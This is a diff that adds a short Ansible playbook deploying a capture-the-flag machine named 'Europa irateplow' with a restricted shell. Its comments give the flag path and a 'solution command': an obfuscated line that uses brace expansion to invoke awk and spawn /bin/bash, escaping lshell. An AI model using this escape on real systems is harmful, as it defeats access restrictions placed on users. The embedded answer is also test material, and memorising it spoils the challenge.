@@ -1,0 +1,7 @@
+# europa.yml - Deploy Europa irateplow machine.
+# Flag location /flag.txt, reachable after breaking out of lshell
+# solution command: eval a{v..x}k\ \'BEGIN\ {system\(\"/bin/bash\"\)}\'\;
+- hosts: europa
+  tasks:
+      - ping:
+      - import_tasks: roles/europa/tasks/deploy_rbash.yml
